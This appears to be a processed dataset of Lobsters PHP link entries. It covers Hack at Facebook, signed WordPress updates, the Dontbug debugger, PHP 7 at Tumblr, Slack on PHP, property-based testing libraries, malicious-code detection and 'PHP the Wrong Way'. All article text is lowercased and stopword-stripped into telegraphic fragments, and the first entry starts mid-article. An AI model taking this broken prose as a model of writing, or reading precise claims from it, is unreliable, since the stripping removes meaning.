language developed intended make working web elegant efficient good developing kind highstakes software needed run collection server behind large web service also act something like dog whistle coder interested new difficultgrowing upin late facebook crisis php built performance asked perform site growing fast seemed something change fairly drastically would start falling overswitching language altogether option facebook million line php code thousand engineer expert writing half billion user instead small team senior engineer assigned special project invent way facebook keep functioning without giving hacky mother tongueone part solution create piece would translate facebook php code much faster c code feat computer linguistic engineering let facebook programmer keep phpian culture write reliable code startup cleverly use power programming language manipulate organizational psychology rescue squad inventing dialect php called hack hack php optional type system write plain old quick dirty choose tie mast adding annotation let type system check correctness code type checker written entirely ocaml coincidence facebook wanted coder keep moving fast comfort native tongue want break thing last year zuckerberg announced new engineering slogan move fast stable infra using hacker shorthand infrastructure keep site running around time twitter underwent similar transformation service originally built ruby popular web programming framework created using matsumoto ruby inspired large part php came deluge user someone hundred thousand follower tweeted hundred thousand people timeline immediately updated big tweet like would frequently overwhelm system force engineer take site allow catch often fail whale company maintenance page became famous right twitter stopped bleeding replacing large piece service plumbing language called scala surprising scala like ocaml developed academic powerful type system prize correctness performance even expense individual programmer freedom delight craftmuch startup mature finally figuring revenue come cleverly use power programming language manipulate organizational psychology designer guido van rossum spent seven year google work dropbox say software company get certain size way stave chaos use language requires programmer front feel like slowing say everything three time van rossum say many startup wait long making switch lose swaggering hacker got started possibility small team rush new feature exacting language help people across company understand one another code give product stability needed part furniture daily lifethat software startup perform maneuver might even help explain powerful expanding reach computer part company also unique ability remake change grow redraw org chart built code something far drastic rewire culture way thinkjames somers writer new york work geniuscom
175,Lobsters,php,PHP programming,"WordPress to get secure, cryptographic updates",https://ma.ttias.be/wordpress-get-secure-cryptographic-updates/,wordpress get secure cryptographic update,compromising wordpress update infrastructure scott arciszewski paragon initiative syscast podcast application security praised secure wordpress infrastructure attack guide automatic security update php developer pose real threat stability web securing autoupdates federated authentication model secure wordpress infrastructure attack show code sodiumcompat libsodium pecllibsodium,exciting work done regard wordpress autoupdate system allows wordpress team sign update signature verified wordpress installation guarantee installing actual wordpress update something compromised server compromising wordpress update infrastructure work lead security researcher scott arciszewski paragon initiative longtime voice php security community warning potential danger wordpress update infrastructure long time scott discussed syscast podcast application security since wordpress support added autoupdate wordpress installation case critical vulnerability discovered praised really love feature requires effort website maintainer obviously pose threat scott explains currently attacker compromise apiwordpressorg issue fake wordpress update gain access every wordpress install internet automatic updating enabled two minute midnight one minute midnight wordfence team found vulnerability given wordpress ubiquity attacker control website internet grave threat security rest internet know much infrastructure could withstand level ddos secure wordpress infrastructure attack scott already published several security article guide automatic security update php developer arguably important one anyone designing creating cm every cm drupal wordpress joomla us weak update mechanisme attacker manages take control update server additional proof need order issue new update pose real threat stability web securing autoupdates wordpress federated authentication model proposed consists key area scott explains notary wordpress blog service opt hostingverifying update mirror merkle tree contains timestamps signature new public key public key revocation cryptographic hash coreextension update wordpress blog pool notary trust explicitly update received server checking signature wp core public key poll least one trusted notary notary verify update exists match checksum file respond signed message containing challenge nonce response timestamp whether update valid useful event wporg signing key ever compromised sophisticated adversary attempt issue silent targeted update machine interest reliably secure wordpress infrastructure attack way order compromise update system need trick notary accept false update longer merely dependent update system us set peer validate update show money code first patch already proposed wordpress security team evaluate implement concern might work come sodiumcompat php package implement feature provided libsodium modern easytouse crypto library source wordpress support php higher entirely different security threat wordpress let ignore pure php implementation libsodium needed since php binary extension supported far back pecllibsodium extension requires least php higher hoping patch get accepted used soon pretty sure lot party interested getting access wordpress update infrastructure
176,Lobsters,php,PHP programming,SQL injections vulnerabilities in Stack Overflow PHP questions,https://laurent22.github.io/so-injections/,sql injection vulnerability stack overflow php question,potential sql injection vulnerability stack overflow php question latest sql injection vulnerability php question,potential sql injection vulnerability stack overflow php question latest sql injection vulnerability php question click date open question
178,Lobsters,php,PHP programming,Dontbug: A reverse debugger for PHP (based on rr),https://github.com/sidkshatriya/dontbug,dontbug reverse debugger php based rr,dontbug debugger golang demo video debugger feature netbeans eclipse pdt phpstorm xdebug limitation caveat usage brief installation o platform installation instruction dontbug debugger work credit mozillarr xdebug gdb dontbug debugger work golang cyrusandgdb gdbmi chzyerreadline krpty mastermindssemver fatihcolor license copyright using dontbug debugger command php builtin webserver syntax example note php builtin webserver tip however aware recording many page load may degrade performance debugging config file information flag command dbgp basic usage tip gotchas php ides try open browser window start listening debug connection ignore error remember replay frozen time earlier version information flag dontbug prompt debugging reverse mode confusing cheat sheet,dontbug debugger dontbug reverse debugger aka time travel debugger php allows record execution php script command line mode browser replay execution back php ide debugger replay may debug normally forward mode debugging reverse allows step overout backwards step backwards run backwards run cursor backwards set breakpoints past forth debugging ability run reverse allows hunt bug much easily also allows understand runtime behavior large php codebases efficiently dontbug implemented golang bit c demo video debugger feature debug php source forward reverse ability set line breakpoints inspect php variable call stack step overoutinto backwards forward hit breakpoints running reverse forward mode run cursor backwards etc full compatibility existing php ides like netbeans eclipse pdt phpstorm php ideeditor support xdebug special ide plugins modification required ideeditor minimal learning curve apart getting familiar debugging reverse continue using debugger dontbug put reverse mode button ide simply acquire opposite meaning step step backwards confusing cheat sheet ability record php script execution completely even network call database call nondeterministic inputoutput php code replay php script see inputoutput result database network call call rand time etc record however php writeread network database second time replay highly performant forwardreverse mode execution concentrate finding bug debugger get way ability record multiple webserver requestsresponses one go traditional php website debugging done per url basis dontbug record many webserver requestsresponses time debug consolidated execution trace help hit breakpoints code rarely triggered triggered poorly understood situation mean practice pressing runcontinue forward reverse mode often lead nextprevious request debugger end program feature caveat aware recording many page requestsresponses time may degrade performance debugging limitation caveat since dontbug replay saved php script execution trace persistently modify variable value debugger variable state php script readonly limitation fundamental current recordreplay architecture practice big limitation changing variable value debugging rarely needed dontbug beta level quality please report problem encounter dontbug also advanced debugging feature like breaking named exception breaking call toreturn specifically named function conditional breakpoints watch moment planned future release always emulate conditional breakpoints adding statement breakpoint condition line breakpoint inside statement usage brief record execution using dontbug record ask php ide listen debugging connection favorite shell execute dontbug replay dontbug try connect php ide listening debugger connection connected dontbug replay last execution recorded via dontbug record ide connected use debugger ide would normally want run reverse mode press r reverse mode f forward mode dontbug prompt see detail installation o platform see installation instruction installing dontbug machine dontbug debugger work interested dontbug debugger work internally please read document credit standing shoulder giant open source project built help open source project dontbug exception mozillarr xdebug gdb project important open source project dontbug depends existence fantastic open source project allowed dontbug built role contribution three project overall functionality dontbug outlined dontbug debugger work document dontbug executable programmed golang programming language dontbug directly depends number open source golang library cyrusandgdb golang library communicate gdb using gdbmi protocol chzyerreadline golang library gnu readline kind implementation krpty golang library interface unix psuedoterminals related golang library command line interface persistent configuration mastermindssemver golang library version string comparison fatihcolor golang library using color unix terminal may exhaustiveupto date list please refer source code license copyright dontbug copyright sidharth kshatriya dontbug licensed term apache license version using dontbug debugger installed dontbug two command available dontbug record dontbug replay see dontbug record help dontbug replay help information continue reading command dontbug record dontbug record command record execution php script php builtin webserver php command line interpreter used later forwardreverse debugging php ide typical workflow dontbug record followed dontbug replay syntax dontbug record phpsourcerootdir docrootdir flag dontbug record phpsourcerootdir phpscript phpcliscript argsinquotes flag example dontbug record varwwwfancysite docroot dontbug record varwwwanothersite dontbug record phptest listsupportedfunctionsphp phpcliscript dontbug record phptest mathcalculatefactorialminmaxphp phpcliscript args first example spawn php builtin webserver recording execution fancysite website user navigates various url browser docroot fancy site varwwwfancysitedocroot phpsourcedir varwwwfancysite general dontbug able handle php frameworkcms long meet minimum requirement frameworkcms run php built webserver php built webserver substituting apache nginx etc second example like first docrootdir assumed phpsourcerootdir third example record execution phptestlistsupportedfunctionsphp fourth example record execution php script two argument passed note quote enclose argument script full path phptestmathcalculatefactorialminmaxphp seen specify docrootdir phpscript specified relative path wrt phpsourcerootdir phpsourcerootdir mean outermost directory possible php script might executed project php source project note typically phpsourcerootdir would docroot php project sometimes parent folder phpsourcerootdir docrootdir sometimes script might placed outside docroot php project eg vendor script installed composer please keep directory specific possible example could specify root directory phpsourcerootdir contains possible php script system would impact performance hugely source symlinked inside phpsourcerootdir outside dir dontbug able handle without increase scope phpsourcerootdir php builtin webserver tip may record many http page load later debugging running php built webserver unlike traditional php debugging usually one page load time however aware recording many page load may degrade performance debugging additionally may pas argument php built server ie args flag ignored used conjunction phpcliscript config file find frequently passing flag dontbug may provide custom config various flag homedontbugyaml file sample file serverport installlocation somepathsrcgithubcomsidkshatriyadontbug parameter default suffice typically need minimal dontbugyaml config file flag passed via command line always override configuration yaml file yaml file user flag nt specify particular parameter default mentioned dontbug record help apply information flag see dontbug record help information various flag available customization option command dontbug replay dontbug replay command replay previously saved execution trace php ide debugger may set breakpoints step code inspect variable value etc used interestingly dontbug allows reverse debug ie step backwards run backwards hit breakpoints running reverse forth dontbug communicates php ides using dbgp protocol defacto standard php ides special support required dontbug work far ides concerned talking normal php debug engine basic usage record execution using dontbug record see dontbug record help know ask php ide listen debugging connection favorite shell execute dontbug replay dontbug try connect php ide listening debugger connection connected dontbug replay last execution recorded via dontbug record ide connected use debugger ide would normally want run reverse mode press r reverse mode f forward mode dontbug prompt reverse mode button ide remain reverse effect press eg step reverse step forth press h help dontbug prompt information tip gotchas php ides try open browser window start listening debug connection let url access browser likely result error anyways ignore error absolutely effect dontbug replaying previously saved execution trace ide know important thing look message green dontbug connected php ide debugger dontbug prompt see message start debugging php ide normally would except ability run reverse want remember replay frozen time change php code replay need dontbug record nt dontbug replay replay php execution corresponding earlier version source code php ide show current php source code lead lot confusion weird behavior may imagine essentially need make sure php source newer last recording simply dontbug record advancedexperimental flag takesnapshot see dontbug record help allows record execution take source code snapshot issue dealt principled way however feature fully documented yet increase complexity workflow therefore simply dontbug record php source changed since last recording information flag see dontbug replay help information various flag available customization option dontbug prompt upon running dontbug replay prompt available switch forward reverse mode prompt also help press h followed enter get help dontbug h h display help text q quit r debug reverse mode f debug forward normal mode toggle reverse forward mode v toggle verbose quiet mode n toggle showing showing gdb notification enter tell whether forward reverse mode debugging reverse mode confusing cheat sheet button php ide debugger following new opposite meaning reverse debugging mode step mean step php statement reverse direction step mean step one php statement backwards usual stop encounter breakpoint operation step mean run backwards come current function enter usual stop encounter breakpoint operation runcontinue mean run backwards hit breakpoint run cursor mean run backwards hit cursor need place cursor current line
179,Lobsters,php,PHP programming,PHP 7 at Tumblr,https://engineering.tumblr.com/post/152998126990/php-7-at-tumblr,php tumblr,timeline oli trav testing phan performance language feature summary,tumblr always looking new way improve performance site mean thing like adding caching heavily used codepaths testing new cdn configuration upgrading underlying softwarerecently crossteam effort upgraded full web server fleet php php whole upgrade fun project cool result wanted share youtimelineit started hackday project fall oli trav got tumblr running one php release candidate point time quite php extension support version yet unofficial fork floating around experimental support nevertheless actually ran spring thing starting get stable decided time start looking upgrading closely one first thing package new version installation would easy consistent parallel ported inhouse php extension new version everything would ready available getgoa small script written would upgrade downgrade developer server late spring summer test run php package build iterated performance measured evaluated thing stabilized started roping developer daytoday work php machinesfinally end august felt confident testing rolled php small percentage production server two week later incrementally ramping every server responding user request updated testingwhen upgrade like course important test everything make sure code behaves way couple approach thisphan project used find code codebase would incompatible php made easy find lowhanging fruit fix issueswe also suite unit integration test helped lot identifying working way used since normal development continued alongside project needed make sure new code added php set ci task run test php php end rollout final result well two thing stand big improvement u performance language featuresperformancewhen rolled php first batch server obviously kept close eye various graph make sure thing running smoothly mentioned looking performance improvement realworld result striking almost immediately saw latency drop half cpu load server decrease least often server serving page twice fast using half amount cpu resourcesthese graph one server handle api see latency dropped le half load average peak lower previous lowest point language featuresphp also brings lot fun new feature make life developer tumblr bit easier highlight scalar type hint php historically fairly poor type safety php introduces scalar type hint ensures value passed around conform specific type string bool int float etc return type declaration php function explicit return type language enforce reduces need boilerplate code manually checking return value functionsanonymous class much like anonymous function closure anonymous class constructed runtime simulate class conforming interface even extending class great utility object like logging class useful unit testsvarious security performance enhancement across boardsummaryphp pretty rad
180,Lobsters,php,PHP programming,Taking PHP Seriously,https://slack.engineering/taking-php-seriously-cf7a60065329,taking php seriously,option pretty impressive background php born web server personal home page trait closure generator virtue php state concurrency programmer workflow second case php hate surprise type conversion inconsistency around reference value semantics failureoblivious philosophy php inconsistency standard library serious problem make defect likely hhvm hack hack gradual typing system go play surprise type conversion reference value semantics banning oldstyle reference failureobliviousness inconsistency standard library hhvm hiphop virtual machine report wikipedia looking ahead apply note back text http dlacmorgcitationcfm back text go back text back text,slack us php serverside application logic unusual choice day choose build new project language programmer casually used php know two thing bad language would never use given choice extraordinarily successful project history use quite contradiction make u curious facebook wikipedia wordpress etsy baidu box recently slack succeed spite using php would better expressing application ruby erlang haskell perhaps phpthelanguage many flaw undoubtedly slowed effort phptheenvironment virtue compensate flaw option improving php languagelevel flaw pretty impressive balance php provides better support building changing operating successful project competing environment would start new project php today reservation two zero apology background uniquely among modern language php born web server strength tightly coupled context requestoriented serverside execution php originally stood personal home page first released rasmus lerdorf aim supporting small simple dynamic web application like guestbooks hit counter popular web early day php inception used far complicated project creator anticipated several major revision brought new mechanism wrangling complex application today featurerich member mixedparadigm developer productivity language mpdpl family includes javascript python ruby lua last touched php early aught contemporary php codebase might surprise trait closure generator virtue php php get several thing deeply uniquely right first state every web request start completely blank slate namespace globals uninitialized except standard globals function class provide primitive functionality life support starting request known state get kind organic fault isolation request encounter software defect fails bug directly interfere execution subsequent request state reside place program heap course possible statefully mess database memcache filesystem php share weakness conceivable environment allow persistence isolating request heap one another reduces cost program defect second concurrency individual web request run single php thread seems first like silly limitation since program executes context web server natural source concurrency available web request asynchronously curl ing localhost even another web server provides sharednothing copyincopyout way exploiting parallelism practice safer resilient error locksandsharedstate approach generalpurpose language provide finally fact php program operate request level mean programmer workflow fast efficient stay fast application change many developer productivity language claim reset state request main event loop share programlevel state request almost invariably startup time typical python application server eg debugging cycle look something like think edit restart server send test request even restart server take second wallclock time take big cut second finite human brain hold delicate state place claim php simpler think edit reload page cycle make developer productive course long complex software project life cycle productivity gain compound case php true hate boil colorful hyperbole away common complaint php cluster around root cause surprise type conversion almost language day let programmer compare eg integer float operator heck even c allows perfectly clear intended le clear comparing string integer supposed mean different language made different choice php choice department especially perverse leading surprise undetected error instance evaluates true see false hmm inconsistency around reference value semantics php clear semantic assignment argument passing return value creating logical copy data question programmer opt reference semantics annotation clashed introduction objectoriented programming facility php though much php oo notation borrowed java java semantic object treated reference primitive type treated value current state php semantics object passed reference choosing java say c primitive type passed value java c php agree older reference semantics notation persist sometimes interacting new world weird way failureoblivious philosophy php try hard keep request running even done something deeply strange instance division zero throw exception return inf fatally terminate request default warns evaluates value false since false silently treated numeric context many application deployed run undiagnosed division zero particular issue changed php design impulse keep plowing ahead past could possibly make sense pervades library inconsistency standard library php young audience familiar c many apis used c standard library design language sixcharacter lower case name success failure returned integer return value real value returned calleesupplied param etc php matured c style namespacing prefixing became pervasive etc recently java style camelcase method camelcase class become common way introducing new functionality sometimes see code snippet interleave expression like new directoryiterator path f fopen p w jarring way lest seem like unreflective php apologist serious problem make defect likely unforced error inherent tradeoff good part php problem possible build php limit downside preserving good part hhvm hack successor system php called hack hack programming language people call gradual typing system php typing system mean allows programmer express automatically verifiable invariant data flow code function take string integer return list fribbles like java c haskell whatever statically typed language favor gradual part mean part codebase statically typed part still roughandtumble dynamic php ability mix enables gradual migration big codebases rather spill ton ink describing hack type system work go play get back neat system quite ambitious allows express option gradually migrating project hack case grows larger first expected unique advantage php ecosystem hack type checking preserve think edit reload page workflow type checker run background incrementally updating model codebase see modification filesystem hack project provides integration popular editor ides feedback type error come soon done typing like web demo let evaluate set real risk php pose light hack surprise type conversion become error hack file entire class problem boil away reference value semantics cleaned simply banning oldstyle reference hack since unnecessary new codebases leaf behind objectsbyreferenceandeverythingelsebyvalue semantics java c php failureobliviousness property runtime library harder semantic checker like hack reach directly system however practice form failureobliviousness require surprise type conversion get far instance problem arise propagating false returned division zero eventually cross typechecked boundary fails treating boolean numerically boundary frequent hack codebases making easier write type hack decrease skid distance many buggy execution practice finally inconsistency standard library persist hack hope make le painful wrap safer abstraction hack provides option popular member mpdpl family ability introduce type system initial development part system value exceeds cost hhvm hack originally developed part hiphop virtual machine hhvm open source jit environment php hhvm provides another important option successful project ability run site faster economically facebook report improvement cpu efficiency php interpreter wikipedia report improvement slack recently migrated web environment hhvm experienced significant drop latency endpoint lack applestoapples measurement cpu efficiency writing also process moving portion codebase hack report experience looking ahead started apparent paradox php really bad language used lot successful project find reputation poor language isolation pretty well deserved success project using property php environment highcadence workflow enables php language advantage environment reduced cost bug fault isolation safe concurrency high developer throughput valuable problem language flaw create also uniquely among mpdpls clear migration path higher performance safer maintainable medium form hack hhvm slack later stage transition hhvm early stage transition hack optimistic let u produce better software faster slack technology inc looking great technologist join u apply note made term mpdpl little direct genetic relationship among language influenced one another heavily looking past syntax much similar different universe programming language includes mips assembly haskell c forth erlang hard deny mpdpls form tight cluster language design space back text unfortunately marked callee caller programmer declares desire receive params reference actually passing reference unmarked make hard understand might change reading code complicates efficient implementation php significantly see figure http dlacmorgcitationcfm back text yes hack nearly ungoogleable programming language name hacklang sometimes used ambiguity possible google name popular language stillmoreungoogleable go back text typechecks hack program also enforced runtime default piggyback php type hint facility increase safety mixed codebases hack classic php comingled back text
181,Lobsters,php,PHP programming,"Ewww, You Use PHP? (2010)",https://blog.mailchimp.com/ewww-you-use-php/,ewww use php,marketing tip,marketing tip little knowledge go long way sharing smart simple way help reach goal matter big small
182,Lobsters,php,PHP programming,Comparison of Hypothesis and Eris property based testing libraries,http://hypothesis.works/articles/hypothesis-vs-eris/,comparison hypothesis eris property based testing library,eris quickcheck testcheck hello world composing strategy filtering generated value transforming generated value generator random parameter future brings reference example repository eris repository github,eris library propertybased testing php code inspired mature framework language provide like quickcheck clojure testcheck course hypothesis sidebyside comparison basic advanced feature implemented hypothesis eris may help developer coming either python php looking side hello world first example considered hello world randomized testing given two random number sum constant matter order summed test case two input parameter run dozen hundred time run different increasingly complex input value hypothesis provides idiomatic python solution given decorator used compose strategy object instantiated hypothesisstrategies test case similar examplebased one except addition argument import unittest hypothesis import given hypothesis import strategy st class testeris unittesttestcase comparing syntax implementation feature eris given stintegers stintegers def testsumiscommutative self first second x first second second first selfassertequal x sum commutative first second example using unittest syntax maximum test portability affect hypothesis work across testing framework eris provides functionality trait instead composed test case need access randomized input test method augmented additional parameter code moved inside anonymous function primitive input distribution defined mathematicallynamed forall primitive php use erisgenerator use eristesttrait class integertest extends phpunitframeworktestcase use testtrait public function testsumiscommutative forall generatorint generatorint function first second x first second second first assertequals x sum first second commutative test run hundred time computing two sum comparing equality assertion library underlying testing framework unittest phpunit composing strategy simple composition problem consists generating collection data structured whose element drawn known distribution example list integer hypothesis provides strategy compose strategy case build list random integer arbitrary length given stlists stintegers def testsortingalisttwiceisthesameassortingitonce self x xssort y list x xssort selfassertequal x y eris call generator object representing statistical distribution us compositional pattern higherorder value like list collection public function testarraysortingisidempotent forall generatorseq generatornat function array sort array expected array sort array assertequals expected array test case generate random list check sorting operation idempotent operating twice input data give result operating filtering generated value problem abstract enough accept value input may necessary exclude part generated value fit need hypothesis provides filter method apply lambda value expressing condition included test given stintegers filter lambda x x def testfiltering self x selfassertgreater x eris allows filter value predicate way prefers allocate filter generic forall object rather decorate generator public function testwhenwithananonymousfunctionwithgherkinsyntax forall generatorchoose function n return n function number asserttrue number number filtered number filtering construct follow integrated shrinking hypothesis eris test fails shrinking start constraint transformation continue applied generated value simpler input still going belong distribution scenario shrinking would able propose number greater transforming generated value another common need consists transforming generated value different space example set even number rather larger set integer hypothesis allows passing lambda map method strategy given stintegers map lambda x x def testmapping self x selfassertequal x eris instead provides map higherorder generator applies lambda generation public function testapplyingafunctiontogeneratedvalues forall generatormap function n return n generatornat function number asserttrue number number even case advantage using map support library rather writing multiplying code test resulting object composed build larger data structure like list set even number generator random parameter possible build even stricter value internal constraint must satisfied easily generated applying pure function previously generated value hypothesis provides flatmap method pas output inner strategy lambda creates outer strategy use test list integer passed lambda generate tuple consisting list random element chosen given stlists stintegers flatmap lambda x sttuples stjust x stsampledfrom x def testlistandelementfromit self pair generatedlist element pair selfassertin element generatedlist eris slighly different naming calling primitive bind public function testcreatingabrandnewgeneratorfromageneratedvalue forall generatorbind generatorvector generatornat function vector return generatortuple generatorelements vector generatorconstant vector function tuple list element vector tuple assertcontains element vector future brings hypothesis much mature project eris especially come keeping state test run acting generic random data provider rather extension testing framework interesting continue porting hypothesis feature php world given original feature pattern hypothesis show respect rest check world reference hypothesis example shown post found example repository eris example instead found example folder eris repository github
183,Lobsters,php,PHP programming,Detecting potentially malicious PHP code using checksums and heuristics on parse trees,http://blog.garage-coding.com/2016/09/01/detecting-potentially-malicious-php-code-using-parsers-and-heuristics.html,detecting potentially malicious php code using checksum heuristic parse tree,,transformation build mast merkelized abstract syntax tree use later order identify matching portion logic different program summary bottomup construction merkle tree start leaf assign leaf hash based node name progressively higher level take node concatenate name previously computed hash child compute hash assign hash node continue entire process including root node main usecase identifying file structure however checksum subtrees root toplevel checksum entire ast also check similar codeblocks diagram left right describes original tree look like diagram right explains merkle tree look xquery implementation algorithm described declare function local mast node node typeswitch node case element return prevent stack overflow tree operate usually max depth le compute child recursively let newc c nodenode return local mast c get child hash let nc stringjoin newc h get current node name let nn nodename node concatenate current node name child hash let msg nn nc compute hash entire subtree rooted current node let subtreehash crypto hmac msg hardcodedkey hex return element nn attribute h subtreehash newc else case text return default return usage example local mast db open xtrees filephp node regular ast look like compared mast tree stored basex mast computed code mast computed ignoring leaf node adding checksum attribute node node also carry start end start line number end line number parse rule associated node using startend attribute refer back part source code matched one checksum
184,Lobsters,php,PHP programming,PHP - The Wrong Way,http://www.phpthewrongway.com/,php wrong way,welcome php wrong way translation danger extremism kiss principle wrong way always use framework rasmus lerdorf django ruby rail framework ideal number line code project possible whilst clear readable possible rasmus lerdorf wrong way always use design pattern coder work reflection craft programming paul graham evil design pattern wrong way always use objectoriented programming coder work reflection craft programming coder work reflection craft programming one way soon try forcefeed different problem within application single specific programming paradigm thinking creatively working efficiently small history lesson car hoare go statement considered harmful simula ansi common lisp wrong way afraid people code coder work reflection craft programming linux kernel bsd linux gnu userland normal art programming programmer wrong way following phpfig standard religiously phpfig faq also original name group wrong way neglecting security defprogrammingcom security something added software secure default ray ozzie wrong way faq q q q q q q q recommended reading php wrong way hacker news bad scientific code beat code following best practice program without oop coder work reflection craft programming trait proficient programmer owasp secure coding guideline security design principle survive deep end php security refactoring improving design existing code practice programming pragmatic programmer understanding programming language contribute github,welcome world php programming set trend massively propagated people book website modern php approach frowned upon backward stupid plain wrong people seem work tirelessly getting people follow way thing website created attempt present pragmatic view php programming view dictated experience practical consequence rather popular trend theory academic dogma website php wrong way living document continue updated information becomes available feel free contribute translation danger extremism one problem programming rule guideline often serve purpose within specific context taken context good rule become horrible rule fact every good rule becomes bad taken extreme important understand many software development principle rule developed time presented many different people often become misused hand extremist experience taught misuse general rule guideline always result complication lack security errorprone result case complete utter disaster kiss principle acronym keep simple stupid extremely wise good principle generally viewed experienced people good advice follow even great principle becomes danger project taken extreme thing simple resulting lack needed functionality wrong way religious following rule guideline always use framework general purpose php framework suck rasmus lerdorf php community really bad trend become defacto standard developing web application usage popular general purpose framework trend emerged become popular way improves result developing process right thing technology architectural point view trend become popular developer framework managed sweep away mass polemic programming ground stanza like reinvent wheel others skillful many today programmer completely ignore fundamental principle sound programming spend large amount time fantasizing new layer complexity order appear clever cool acceptable whomever regard peer people seems infatuated thought people follow way thing becoming kind php community leader people use latest hip open source tool forget make sure advice giving sound solid software industry compare prebuilt house general purpose framework building software using general purpose framework make coder programmer putting together prebuilt house make carpenter website differentiate framework library following way library considered collection reusable code like c standard library go standard library consists code easily integrate project without enforcing limitation restriction whatsoever consists small piece code one specific functionality framework collection reusable code simply take piece code framework integrate project framework system help build software time force work within limitation restriction framework framework lot interdependent functionality one piece work without world python ruby building website ground tiresome neither python ruby originally created build website result generalpurpose framework django ruby rail quickly became popular building website language php hand created beginning rasmus lerdorf set tool written c would enable easily quickly develop dynamic html php still framework php evolved massively since today php used much building html website viewing php sort framework wrong php nature layer abstraction developing web application written entirely procedural c using library within project natural php come bundled set library use extend code pdo example lightweight library provides consistent interface accessing database php using framework top php hand another matter entirely use framework php add layer abstraction top yet another layer abstraction one already place use begin added layer abstraction framework provides may simply serve organize code prefixed set pattern may add even complexity intertwining hundred even thousand class method nightmare dependency either way adding layer complexity code needed experience start interface interface experience result underlying technology amount layer abstraction abstraction use le efficient interface becomes errorprone application becomes higher abstraction detail efficiency lost understand clearly ideal number line code project possible whilst clear readable possible everyone need general purpose framework nobody general problem everyone specific problem trying solve rasmus lerdorf company began listening hype php framework started next project using one popular general purpose framework end disaster discover general purpose framework really bad solving specific need also extremely slow impossible scale result started ripping framework apart desperate attempt pull thing really need always use pragmatic approach action policy dictated consideration immediate practical consequence rather theory dogma collins english dictionary complete unabridged edition wrong way always use framework top php always use design pattern big allergy ivorytower design design pattern peter norvig harlequin paper design pattern really flaw programming language get better programming language absolutely right worshiping pattern thinking oh use x pattern brendan eich coder work reflection craft programming software engineering design pattern reusable solution commonly occurring problem software design design pattern finished design transformed directly code description idea solve problem used many different situation objectoriented design pattern typically show relationship interaction class object without specifying final application class object involved php support imperative functional objectoriented procedural reflective paradigm php huge toolbox lot different tool make possible solve many problem many different way one way php freedom fast scalable solution many different way deal problem try improve case specifically code sometimes get hung philosophy particular pattern idea tend forget think practically see pattern program consider sign trouble shape program reflect problem need solve regularity code sign least using abstraction powerful enough often generating hand expansion macro need write paul graham get caught philosophy idea behind specific pattern solution main concern keep code easy navigate understand possible result easy maintain easy keep secure must also remember exists thing antipattern pattern may commonly used ineffective andor counterproductive practice think pattern started generally recognized best solution common problem around experienced application made ten time complicated need people try cram pattern read application well architected loaded gill pattern impression value pattern shifted bit paul weaton evil design pattern always use pragmatic approach action policy dictated consideration immediate practical consequence rather theory dogma collins english dictionary complete unabridged edition wrong way looking pattern solve problem always use objectoriented programming problem objectoriented language got implicit environment carry around wanted banana got gorilla holding banana entire jungle joe armstrong coder work reflection craft programming abstraction powerful really allergic reaction corba com dcom objectoriented nonsense every startup day crazy thing would take method call start print hello world travesty want programmer associated sort thing brendan eich coder work reflection craft programming many software developer many company feel objectoriented programming reasonable way develop software today one argues objectoriented programming immediately made conscious fact arguing conventional wisdom industry programming blog forum great many people defend objectoriented programming feel certain know talking despite lack standard definition fact socalled objectoriented programming often inflicts heavy burden unneeded complexity computer scientist programmer must learn set aside prejudice find best solution given problem today one main strength php support imperative functional objectoriented procedural reflective paradigm php huge toolbox lot different tool make possible solve many problem many different way one way soon try forcefeed different problem within application single specific programming paradigm thinking creatively working efficiently small history lesson one greatest way understand specific programming paradigm look first evolved reason development problem existed programming paradigm needed new way thinking real world problem simply academic problem since evolved matter person x say definition person give matter context paradigm history made two way constructing software design one way make simple obviously deficiency way make complicated obvious deficiency car hoare past advent objectoriented programming around end fifty much software developed using programming language emphasized unstructured programming sometimes referred first secondgeneration language unstructured programming nonstructured programming historically earliest programming paradigm heavily criticized producing spaghetti code high lowlevel programming language use nonstructured programming include early version basic cobol mumps joss focal telcomp machinelevel code early assembler system without procedural meta operator scripting language program nonstructured language usually consists sequentially ordered command statement usually one line line usually numbered may label allows flow execution jump line program like unpopular goto statement sixty structured programming emerged mainly due famous letter edsger w dijkstra go statement considered harmful structured programming programming paradigm improves clarity quality development software making use subroutine block structure loop contrast using simple jump goto statement later procedural programming derived structured programming procedural programming based upon concept procedure call procedure call another name function call procedure also known routine subroutine method procedure simply contain series computational step carried given procedure might called point program execution including procedure beginning procedure available part program global data small program present problem thing got complicated size program grew small change one part program greatly effected many part nobody planning change program lot dependency existed minor change one procedure would result cascade error lot procedure depended original code new technique evolved allowed data divided separated scope called object specific procedure belonging scope could access data called data hiding encapsulation result much better organized code beginning object called object viewed upon separate scope later dependency reduced connection procedure variable inside scope viewed upon isolated segment result gave birth concept object objectoriented programming later mainly due development java certain buzzword arose procedure function longer called function renamed method resided inside separate scope variable also longer called variable renamed attribute resided inside separate scope object essence simply collection function variable called method attribute way method attribute kept isolated inside separate scope usage class class instantiated called object object reference reference method function inside communicate object also inherit method object thereby extending called inheritance way reuse code allow independent extension software via public class interface relationship object give rise hierarchy inheritance invented programming language simula object also inherit method object override added changed functionality called polymorphism different idea implemented vary greatly programming language programming language objectoriented programming organizing code another way extension procedural programming hiding data encapsulation avoiding global scope extending function borrowing blueprint without actually affecting original code inheritance overriding function without affecting original code polymorphism objectoriented model make easy build program accretion often mean practice provides structured way write spaghetti code paul graham ansi common lisp wrong way always use objectoriented programming afraid people code argument often expressed usage framework people want deal codebases written scratch people however strange mentality mainly encountered amongst web developer php community one exudes lack professionalism experience writing software dealing people code normal part daily work professional programmer something afraid professional programmer look people code start whining complete mercy former programmer perhaps longer associated company project former programmer used framework framework b day would saved mentality professional programmer nobody perhaps low barrier entry php web development play part kind mentality regardless sign person wrong line work great part programming deal people work people code part work trying improve existing codebase sometimes involves complete rewrite take note great master programming read book coder work reflection craft programming largest successful codebases world codebases developed hundred people never even met codebases developed without use kind framework codebases done entirely procedural programming language without use anything procedural paradigm dream differently linux kernel consists million line code written entirely using procedural programming participant without use kind framework different bsd flavor linux gnu userland written entirely using procedural programming without use kind framework go hundred open source project around world eventually abandoned original programmer picked skillful programmer many project little documentation comment codebase guideline help offer entire php codebase done c pure procedural programming language without use kind framework whatsoever whenever define class php whenever fire favorite php framework running someone else pure procedural work sure exists thing horrible code code perhaps designed onset code perhaps outgrown many time client want deal rewrite code bad make head tail longer kind framework would prevented situation often natural growth process program eventually kind framework would torn piece anyway sure exists horrible spagetti code nobody produce horrible spagetti code purpose sometimes result lack experience often time client fault change specification several time middle development either way case even framework used result would still spaghetti code matter much objectoriented paradigm used result would still spaghetti code programmer try prevent situation normal art programming part mean programmer wrong way 